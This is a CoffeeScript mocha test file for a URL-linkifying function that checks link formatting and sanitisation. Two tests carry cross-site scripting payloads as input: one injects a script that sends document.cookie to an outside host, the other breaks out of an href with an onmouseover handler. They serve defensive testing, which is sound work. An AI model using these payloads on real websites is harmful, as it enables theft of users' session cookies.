# mocha --compilers coffee:coffee-script/register linkify_spec.coffee 

linkify = require('./index')
assert = require("assert")

describe "linkify", ->  
  it "should linkfy multple links in one string", ->
    input = 'Check out this link http://www.example.com and also http://foo.example.com'
    assert.equal(
      linkify(input),
      'Check out this link <a href="http://www.example.com" title="http://www.example.com">http://www.example.com</a> and also <a href="http://foo.example.com" title="http://foo.example.com">http://foo.example.com</a>'
    )

  it "should support all valid URL characters", ->
    input = "http://example.com?name=John%20Smith&age=22&omg=$-_.+!*'()"
    console.log(linkify(input))

    assert.equal(
      linkify(input),
      '<a href="http://example.com?name=John%20Smith&age=22&omg=$-_.+!*\'()" title="http://example.com?name=John%20Smith&age=22&omg=$-_.+!*\'()">http://example.com?name=John%20Smith&age=22&omg=$-_.+!*\'()</a>'
    )

  it "should sanitize dangerous input", ->
    xss = "http://host/a.php?variable=\"><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi? '%20+document.cookie</script>'"
    assert(
      linkify(xss).indexOf('<script>') == -1
    )

  it "should correctly encapsulate the href attribute", ->
    xss = """http://xss.com/"o`nmouseover=alert('XSS');//"""
    console.log(linkify(xss))
    assert(
      linkify(xss).indexOf('href="http://xss.com/"') == -1
    )

  it "should prepend an http:// to the href but not the link text", ->
    input = "example.com"
    assert.equal(
      linkify(input),
      '<a href="http://example.com" title="http://example.com">example.com</a>'
    )
